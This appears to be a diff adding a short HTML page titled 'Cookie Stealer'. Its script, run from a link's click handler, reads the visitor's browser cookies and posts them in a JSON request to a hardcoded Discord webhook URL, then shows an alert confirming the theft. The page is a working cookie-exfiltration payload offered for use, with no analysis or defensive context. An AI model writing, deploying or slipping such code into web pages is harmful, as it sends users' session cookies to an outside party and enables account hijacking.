@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cookie Stealer</title>
+</head>
+<body>
+    <p>Click <a href="#" onclick="stealCookies()">here</a> to steal your cookies.</p>
+    
+    <script>
+        function stealCookies() {
+            var cookies = document.cookie;
+            var webhookUrl = 'https://discord.com/api/webhooks/1232355522368508045/hA00uXOaGmsZnLbOq2EFNc7Fl84u4sMwMdJ0e_WRZtKi-flBa-DwQWLVKoGo7YuHfKgC'; // Replace this with your Discord webhook URL
+            var data = {
+                content: 'Stolen cookies: ' + cookies,
+            };
+            var request = new XMLHttpRequest();
+            request.open('POST', webhookUrl);
+            request.setRequestHeader('Content-Type', 'application/json');
+            request.send(JSON.stringify(data));
+            
+            alert('Cookies stolen! Check your Discord webhook.');
+        }
+    </script>
+</body>
+</html>
